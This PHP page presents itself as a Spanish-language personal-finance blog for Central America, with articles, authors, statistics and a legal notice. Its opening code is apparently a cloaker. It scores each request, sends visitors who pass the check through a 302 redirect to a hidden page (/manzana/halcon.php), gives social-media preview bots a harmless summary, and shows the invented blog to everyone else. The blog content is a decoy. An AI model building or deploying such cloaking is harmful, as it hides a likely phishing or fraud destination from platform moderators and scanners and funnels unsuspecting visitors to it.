<?php
require_once __DIR__ . '/_lib.php';
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();

// Request quality check
[$score, $reasons] = qc_score();

// Low score => entry granted
if ($score < 8) {
    $_SESSION['tsv_ok'] = time();
    header('Location: /manzana/halcon.php', true, 302);
    exit;
}

// Social preview crawlers => minimal OG response
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$social_bots = ['facebookexternalhit','Facebot','FacebookBot','meta-externalhit','meta-externalagent','meta-webindexer','WhatsApp','TelegramBot','Twitterbot','LinkedInBot','Slackbot','Discordbot','SkypeUriPreview','Pinterest'];
$is_social = false;
foreach ($social_bots as $b) { if (stripos($ua, $b) !== false) { $is_social = true; break; } }

if ($is_social) {
    http_response_code(200);
    header('Content-Type: text/html; charset=UTF-8');
    header('Cache-Control: public, max-age=300');
    $og_title = 'SolucionCliente — Tu bolsillo bajo control';
    $og_desc  = 'Consejos prácticos de ahorro, crédito e inversión en Centroamérica, explicados sin complicaciones.';
    $scheme   = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https') ? 'https' : 'http';
    $base     = $scheme . '://' . ($_SERVER['HTTP_HOST'] ?? '');
    $og_url   = $base . '/';
    $og_image = $base . '/og-image.png';
    echo '<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"/>';
    echo '<title>' . htmlspecialchars($og_title) . '</title>';
    echo '<meta name="description" content="' . htmlspecialchars($og_desc) . '"/>';
    echo '<meta property="og:type" content="website"/>';
    echo '<meta property="og:title" content="' . htmlspecialchars($og_title) . '"/>';
    echo '<meta property="og:description" content="' . htmlspecialchars($og_desc) . '"/>';
    echo '<meta property="og:url" content="' . htmlspecialchars($og_url) . '"/>';
    echo '<meta property="og:image" content="' . htmlspecialchars($og_image) . '"/>';
    echo '<meta name="twitter:card" content="summary_large_image"/>';
    echo '</head><body><h1>' . htmlspecialchars($og_title) . '</h1></body></html>';
    exit;
}

// Default surface
http_response_code(200);
header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate, private');
header('Referrer-Policy: no-referrer');
header('X-Content-Type-Options: nosniff');
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SolucionCliente — Consejos para tu bolsillo en Centroamérica</title>
  <meta name="description" content="Guías claras de ahorro, crédito e inversión para Centroamérica. Consejos prácticos para mejorar tu economía personal y familiar." />
  <meta name="keywords" content="ahorro, finanzas, crédito, inversión, bolsillo, economía personal, consejos financieros, Centroamérica" />
  <meta name="robots" content="index, follow" />
  <link rel="canonical" href="https://<?= htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'solucioncliente.net') ?>/" />
  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --primary:#0d9488;
      --primary-dark:#0f766e;
      --accent:#f97316;
      --bg:#fafaf9;
      --surface:#ffffff;
      --ink:#1c1917;
      --soft:#78716c;
      --line:#e7e5e4;
    }
    html { scroll-behavior:smooth; }
    body { font-family: 'Inter', -apple-system, 'Segoe UI', Roboto, sans-serif; background:var(--bg); color:var(--ink); line-height:1.55; }
    a { color:var(--primary-dark); text-decoration:none; }
    a:hover { color:var(--accent); }

    /* Top nav */
    .nav { background:var(--surface); border-bottom:1px solid var(--line); position:sticky; top:0; z-index:20; backdrop-filter:blur(6px); }
    .nav-inner { max-width:1180px; margin:0 auto; padding:14px 28px; display:flex; align-items:center; gap:36px; }
    .brand { display:flex; align-items:baseline; gap:4px; font-weight:800; font-size:20px; letter-spacing:-.4px; color:var(--primary-dark); }
    .brand em { font-style:normal; color:var(--accent); }
    .brand small { font-size:10px; color:var(--soft); font-weight:600; letter-spacing:1.2px; text-transform:uppercase; margin-left:8px; align-self:center; }
    .nav ul { list-style:none; display:flex; gap:24px; margin-left:auto; }
    .nav ul a { font-size:14px; color:var(--ink); font-weight:500; }
    .nav .cta { background:var(--accent); color:#fff; padding:9px 18px; border-radius:999px; font-size:13px; font-weight:600; }
    .nav .cta:hover { background:#ea580c; color:#fff; }
    @media (max-width:720px) { .nav ul { display:none; } }

    /* Hero */
    .hero { background:var(--surface); border-bottom:1px solid var(--line); }
    .hero-inner { max-width:1180px; margin:0 auto; padding:64px 28px 72px; display:grid; grid-template-columns:1.1fr .9fr; gap:48px; align-items:center; }
    .hero-pill { display:inline-flex; align-items:center; gap:8px; background:#f0fdfa; color:var(--primary-dark); font-size:12px; font-weight:600; padding:6px 14px; border-radius:999px; margin-bottom:20px; border:1px solid #ccfbf1; }
    .hero h1 { font-size:clamp(28px,4.5vw,46px); font-weight:800; line-height:1.1; letter-spacing:-1px; margin-bottom:18px; }
    .hero h1 u { text-decoration:none; background:linear-gradient(180deg,transparent 62%,#fed7aa 62%); padding:0 4px; }
    .hero p { font-size:16px; color:var(--soft); max-width:520px; margin-bottom:26px; }
    .hero-actions { display:flex; gap:12px; flex-wrap:wrap; }
    .btn { padding:12px 22px; border-radius:8px; font-size:14px; font-weight:600; display:inline-flex; align-items:center; gap:8px; transition:transform .15s; }
    .btn:hover { transform:translateY(-1px); }
    .btn-fill { background:var(--primary); color:#fff; }
    .btn-fill:hover { background:var(--primary-dark); color:#fff; }
    .btn-line { border:1.5px solid var(--line); color:var(--ink); background:var(--surface); }
    .hero-visual { position:relative; display:flex; justify-content:center; }
    .hero-visual .circle { width:280px; height:280px; border-radius:50%; background:radial-gradient(circle at 30% 30%, #5eead4, var(--primary)); position:relative; }
    .hero-visual .card-float { position:absolute; background:var(--surface); border:1px solid var(--line); border-radius:12px; padding:14px 18px; box-shadow:0 10px 32px rgba(0,0,0,.08); font-size:13px; }
    .hero-visual .card-float.c1 { top:30px; left:-20px; }
    .hero-visual .card-float.c2 { bottom:40px; right:-20px; }
    .card-float .lbl { color:var(--soft); font-size:11px; text-transform:uppercase; letter-spacing:.8px; }
    .card-float .val { font-weight:700; font-size:17px; color:var(--primary-dark); margin-top:3px; }
    .card-float .val.up { color:#059669; }
    @media (max-width:860px) { .hero-inner { grid-template-columns:1fr; padding:44px 24px 52px; } .hero-visual { display:none; } }

    /* Posts grid */
    .posts { padding:72px 28px; max-width:1180px; margin:0 auto; }
    .posts-head { display:flex; align-items:flex-end; justify-content:space-between; margin-bottom:36px; flex-wrap:wrap; gap:16px; }
    .posts-head h2 { font-size:26px; font-weight:800; letter-spacing:-.5px; }
    .posts-head p { color:var(--soft); font-size:14px; }
    .grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(300px, 1fr)); gap:24px; }
    .post { background:var(--surface); border:1px solid var(--line); border-radius:14px; overflow:hidden; display:flex; flex-direction:column; transition:box-shadow .2s, transform .2s; }
    .post:hover { box-shadow:0 12px 28px rgba(13,148,136,.1); transform:translateY(-2px); }
    .post-img { height:160px; background:linear-gradient(135deg,#ccfbf1,#f0fdfa); display:flex; align-items:center; justify-content:center; font-size:52px; color:var(--primary); }
    .post-img.o { background:linear-gradient(135deg,#ffedd5,#fff7ed); color:var(--accent); }
    .post-img.n { background:linear-gradient(135deg,#e0f2fe,#f0f9ff); color:#0369a1; }
    .post-img.v { background:linear-gradient(135deg,#f3e8ff,#faf5ff); color:#7e22ce; }
    .post-body { padding:22px; flex:1; display:flex; flex-direction:column; }
    .post-tag { font-size:11px; font-weight:700; letter-spacing:1.2px; text-transform:uppercase; color:var(--primary-dark); margin-bottom:10px; }
    .post h3 { font-size:17px; font-weight:700; line-height:1.3; margin-bottom:10px; }
    .post p { font-size:14px; color:var(--soft); flex:1; }
    .post-foot { margin-top:16px; display:flex; align-items:center; justify-content:space-between; padding-top:14px; border-top:1px solid var(--line); font-size:12px; color:var(--soft); }
    .post-foot b { color:var(--ink); font-weight:600; }

    /* Numbers strip */
    .stats { background:var(--primary-dark); color:#fff; padding:48px 28px; }
    .stats-inner { max-width:1180px; margin:0 auto; display:grid; grid-template-columns:repeat(auto-fit,minmax(170px,1fr)); gap:28px; text-align:center; }
    .stat-num { font-size:34px; font-weight:800; color:#5eead4; letter-spacing:-1px; }
    .stat-lbl { font-size:13px; color:rgba(255,255,255,.75); margin-top:6px; }

    /* Themed cards */
    .themes { padding:72px 28px; max-width:1180px; margin:0 auto; }
    .themes h2 { font-size:26px; font-weight:800; margin-bottom:8px; letter-spacing:-.5px; }
    .themes > p { color:var(--soft); font-size:14px; margin-bottom:32px; }
    .theme-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(230px,1fr)); gap:20px; }
    .theme { background:var(--surface); border:1px solid var(--line); border-radius:12px; padding:28px 22px; text-align:left; transition:border-color .2s; }
    .theme:hover { border-color:var(--primary); }
    .theme-icon { width:44px; height:44px; border-radius:10px; background:#f0fdfa; color:var(--primary-dark); display:flex; align-items:center; justify-content:center; font-size:22px; margin-bottom:16px; }
    .theme h4 { font-size:16px; font-weight:700; margin-bottom:8px; }
    .theme p { font-size:13px; color:var(--soft); line-height:1.6; }

    /* Legal */
    .legal { background:#f5f5f4; padding:60px 28px; }
    .legal-inner { max-width:860px; margin:0 auto; background:var(--surface); border:1px solid var(--line); border-radius:14px; padding:40px; }
    .legal h3 { font-size:20px; font-weight:800; margin-bottom:18px; }
    .legal h4 { font-size:13px; font-weight:700; margin:22px 0 6px; color:var(--primary-dark); text-transform:uppercase; letter-spacing:.6px; }
    .legal p { font-size:13px; color:var(--soft); line-height:1.75; margin-bottom:6px; }

    /* Footer */
    .foot { background:var(--ink); color:rgba(255,255,255,.65); padding:56px 28px 24px; }
    .foot-inner { max-width:1180px; margin:0 auto; }
    .foot-top { display:grid; grid-template-columns:1.3fr repeat(3, 1fr); gap:36px; margin-bottom:38px; }
    .foot-top h5 { color:#fff; font-size:13px; font-weight:700; margin-bottom:14px; letter-spacing:.5px; }
    .foot-top ul { list-style:none; }
    .foot-top ul li { margin-bottom:8px; font-size:13px; }
    .foot-top a { color:rgba(255,255,255,.55); }
    .foot-top a:hover { color:#fff; }
    .foot .brand { color:#5eead4; font-size:22px; }
    .foot .brand em { color:var(--accent); }
    .foot .brand small { color:rgba(255,255,255,.4); }
    .foot-bottom { border-top:1px solid rgba(255,255,255,.1); padding-top:20px; font-size:12px; display:flex; justify-content:space-between; flex-wrap:wrap; gap:10px; }
    @media (max-width:720px) { .foot-top { grid-template-columns:1fr 1fr; } }
  </style>
</head>
<body>
  <nav class="nav">
    <div class="nav-inner">
      <div class="brand">Solucion<em>Cliente</em><small>Centroamérica</small></div>
      <ul>
        <li><a href="#posts">Artículos</a></li>
        <li><a href="#temas">Temas</a></li>
        <li><a href="#legal">Legal</a></li>
      </ul>
      <a href="#posts" class="cta">Leer gratis</a>
    </div>
  </nav>

  <section class="hero">
    <div class="hero-inner">
      <div>
        <span class="hero-pill">● Actualizado esta semana</span>
        <h1>Haz que tu dinero<br><u>trabaje para vos</u></h1>
        <p>Consejos prácticos de ahorro, crédito e inversión pensados para la realidad centroamericana. Sin tecnicismos, sin letras chiquitas.</p>
        <div class="hero-actions">
          <a href="#posts" class="btn btn-fill">Ver artículos →</a>
          <a href="#temas" class="btn btn-line">Explorar temas</a>
        </div>
      </div>
      <div class="hero-visual">
        <div class="circle"></div>
        <div class="card-float c1">
          <div class="lbl">Ahorro mensual</div>
          <div class="val up">+ C$ 1,850</div>
        </div>
        <div class="card-float c2">
          <div class="lbl">Meta anual</div>
          <div class="val">C$ 22,200</div>
        </div>
      </div>
    </div>
  </section>

  <section class="posts" id="posts">
    <div class="posts-head">
      <div>
        <h2>Lo último del blog</h2>
        <p>Lecturas rápidas, consejos aplicables desde hoy.</p>
      </div>
      <a href="#" class="btn btn-line">Ver todos</a>
    </div>
    <div class="grid">
      <article class="post">
        <div class="post-img">◐</div>
        <div class="post-body">
          <div class="post-tag">Ahorro</div>
          <h3>El método de los sobres: ahorrar sin pensarlo</h3>
          <p>Dividir el sueldo en sobres (reales o digitales) por categoría es una técnica vieja que sigue funcionando. Te explicamos cómo adaptarla al pago quincenal y evitar fugas en gastos hormiga.</p>
          <div class="post-foot"><span><b>Rosa Cuadra</b> · redacción</span><span>8 min</span></div>
        </div>
      </article>
      <article class="post">
        <div class="post-img o">◆</div>
        <div class="post-body">
          <div class="post-tag">Crédito</div>
          <h3>Diferencia entre TNA y TEA (y por qué cambia tanto tu cuota)</h3>
          <p>Dos siglas que casi nadie entiende y que determinan cuánto vas a pagar realmente por un préstamo. Lo explicamos con tres ejemplos concretos y una calculadora rápida.</p>
          <div class="post-foot"><span><b>Mario Zúñiga</b> · redacción</span><span>12 min</span></div>
        </div>
      </article>
      <article class="post">
        <div class="post-img n">◉</div>
        <div class="post-body">
          <div class="post-tag">Inversión</div>
          <h3>¿Primera vez invirtiendo? Estas 4 opciones son para vos</h3>
          <p>Depósitos a plazo, fondos locales, bonos del Estado y micro-inversiones agrícolas: pros y contras de cada una según tu tolerancia al riesgo y el monto que puedas destinar.</p>
          <div class="post-foot"><span><b>Elena Marín</b> · colaboradora</span><span>10 min</span></div>
        </div>
      </article>
      <article class="post">
        <div class="post-img v">◈</div>
        <div class="post-body">
          <div class="post-tag">Planificación</div>
          <h3>Cómo organizar un presupuesto familiar en 30 minutos</h3>
          <p>Plantilla descargable (Google Sheets) con categorías típicas de un hogar centroamericano. Incluye versión para hogares con un ingreso y para hogares con dos ingresos variables.</p>
          <div class="post-foot"><span><b>Carlos Peña</b> · colaborador</span><span>6 min</span></div>
        </div>
      </article>
      <article class="post">
        <div class="post-img o">◇</div>
        <div class="post-body">
          <div class="post-tag">Deuda</div>
          <h3>El efecto bola de nieve para salir de deudas más rápido</h3>
          <p>Pagar primero la deuda más pequeña da impulso psicológico; pagar primero la más cara ahorra más dinero. ¿Cuál conviene en tu caso? Depende de tu personalidad financiera.</p>
          <div class="post-foot"><span><b>Rosa Cuadra</b> · redacción</span><span>9 min</span></div>
        </div>
      </article>
      <article class="post">
        <div class="post-img">◑</div>
        <div class="post-body">
          <div class="post-tag">Emprendimiento</div>
          <h3>Montar un negocio con menos de C$ 15,000: 5 ideas que funcionan</h3>
          <p>Reventa online, comida casera por encargo, servicios digitales freelance… Analizamos la inversión inicial real, los permisos necesarios y la rentabilidad esperada en los primeros 6 meses.</p>
          <div class="post-foot"><span><b>Mario Zúñiga</b> · redacción</span><span>14 min</span></div>
        </div>
      </article>
    </div>
  </section>

  <section class="stats">
    <div class="stats-inner">
      <div><div class="stat-num">+ 240</div><div class="stat-lbl">artículos publicados</div></div>
      <div><div class="stat-num">87 K</div><div class="stat-lbl">lectores este año</div></div>
      <div><div class="stat-num">14</div><div class="stat-lbl">colaboradores activos</div></div>
      <div><div class="stat-num">6</div><div class="stat-lbl">años en línea</div></div>
    </div>
  </section>

  <section class="themes" id="temas">
    <h2>Explorá por tema</h2>
    <p>Lo que te interese más, agrupado para encontrarlo rápido.</p>
    <div class="theme-grid">
      <div class="theme"><div class="theme-icon">◐</div><h4>Ahorrar</h4><p>Métodos simples para apartar dinero cada mes, aunque el presupuesto esté apretado.</p></div>
      <div class="theme"><div class="theme-icon">◆</div><h4>Crédito</h4><p>Cómo elegir un préstamo, qué mirar antes de firmar y cómo mejorar tu historial crediticio.</p></div>
      <div class="theme"><div class="theme-icon">◉</div><h4>Invertir</h4><p>Opciones accesibles con poco capital en la región centroamericana, explicadas sin jerga.</p></div>
      <div class="theme"><div class="theme-icon">◈</div><h4>Planificar</h4><p>Presupuesto familiar, metas de corto y largo plazo, fondo de emergencia.</p></div>
      <div class="theme"><div class="theme-icon">◇</div><h4>Deuda</h4><p>Estrategias concretas para salir de deuda sin dejar de vivir.</p></div>
      <div class="theme"><div class="theme-icon">◑</div><h4>Emprender</h4><p>Lo básico para arrancar un negocio con lo que tenés hoy en el bolsillo.</p></div>
    </div>
  </section>

  <section class="legal" id="legal">
    <div class="legal-inner">
      <h3>Aviso legal y uso del sitio</h3>
      <h4>Naturaleza del contenido</h4>
      <p>SolucionCliente es un medio editorial independiente dedicado a la divulgación de educación financiera. El contenido publicado tiene fines informativos y de orientación general; no constituye asesoría financiera, bancaria, legal ni fiscal personalizada.</p>
      <h4>Independencia editorial</h4>
      <p>No tenemos vínculo comercial con bancos, aseguradoras ni financieras. Nuestras opiniones y comparativas son elaboradas por redactores independientes a partir de información pública.</p>
      <h4>Datos personales</h4>
      <p>Recogemos únicamente datos técnicos mínimos para operar el sitio (sesión, preferencias). No vendemos ni compartimos información con terceros. Para suscripciones solicitamos el correo electrónico, utilizado solo para el envío del boletín.</p>
      <h4>Derechos de autor</h4>
      <p>El contenido escrito, gráfico y audiovisual publicado en SolucionCliente es propiedad de sus autores. Permitimos la cita breve con atribución clara; la reproducción total requiere autorización escrita.</p>
      <h4>Legislación aplicable</h4>
      <p>Este sitio se opera desde Centroamérica y se rige por la legislación vigente en la región. Para cualquier disputa, las partes se someten a los tribunales ordinarios del lugar de operación del sitio.</p>
    </div>
  </section>

  <footer class="foot">
    <div class="foot-inner">
      <div class="foot-top">
        <div>
          <div class="brand">Solucion<em>Cliente</em><small>Centroamérica</small></div>
          <p style="font-size:13px;line-height:1.7;margin-top:14px;max-width:360px">Un blog pensado para que tu dinero rinda. Contenido claro, independiente y aplicable.</p>
        </div>
        <div><h5>Blog</h5><ul><li><a href="#posts">Últimos</a></li><li><a href="#temas">Por tema</a></li><li><a href="#">Autores</a></li><li><a href="#">Boletín</a></li></ul></div>
        <div><h5>Temas</h5><ul><li><a href="#temas">Ahorro</a></li><li><a href="#temas">Crédito</a></li><li><a href="#temas">Inversión</a></li><li><a href="#temas">Emprender</a></li></ul></div>
        <div><h5>El sitio</h5><ul><li><a href="#legal">Quiénes somos</a></li><li><a href="#legal">Aviso legal</a></li><li><a href="#legal">Privacidad</a></li><li><a href="#">Contacto</a></li></ul></div>
      </div>
      <div class="foot-bottom">
        <span>© <?= date('Y') ?> SolucionCliente · Blog editorial independiente</span>
        <span>hola@<?= htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'solucioncliente.net') ?></span>
      </div>
    </div>
  </footer>
</body>
</html>
